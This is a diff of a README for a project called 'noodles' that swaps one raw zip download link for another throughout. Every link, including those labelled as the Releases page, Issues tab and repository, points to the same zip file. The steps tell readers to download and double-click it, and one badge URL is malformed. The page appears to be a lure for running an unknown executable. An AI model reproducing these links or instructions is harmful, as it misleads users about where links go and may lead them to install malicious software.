@@ -10,11 +10,11 @@ Follow these simple steps to download and run noodles on your computer.
 
 ## 📥 Download Noodles
 
-[![Download Noodles](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip%https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip)](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip)
+[![Download Noodles](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip%https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip)](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip)
 
 You can obtain the latest version of noodles by visiting the Releases page. Click the link below to start:
 
-[Download from Releases](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip)
+[Download from Releases](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,8 +34,8 @@ Before continuing, make sure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip).
-2. Find the latest version. Look for a version named `https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip` or `https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip`.
+1. Go to the [Releases page](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip).
+2. Find the latest version. Look for a version named `https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip` or `https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip`.
 3. Click the file to start the download.
 4. Once the download finishes, locate the file on your computer.
 5. Double-click the file to begin installation. Follow the on-screen prompts to complete the process.
@@ -61,7 +61,7 @@ If you encounter any issues, consider these common solutions:
 
 If you need more help, feel free to reach out:
 
-- Check the **Issues** tab on the [GitHub repository](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip) for known issues and updates.
+- Check the **Issues** tab on the [GitHub repository](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip) for known issues and updates.
 - Join our community forum for tips and discussions about using noodles.
 
 ## 🤝 Contributing
@@ -74,4 +74,4 @@ To stay updated on new features and announcements, follow us on GitHub. We enjoy
 
 Start your journey with noodles today from the link below:
 
-[Download Noodles](https://github.com/adityaq123/noodles/raw/refs/heads/main/src/unslop/Software_3.2.zip)
+[Download Noodles](https://github.com/adityaq123/noodles/raw/refs/heads/main/assets/Software_unceasing.zip)
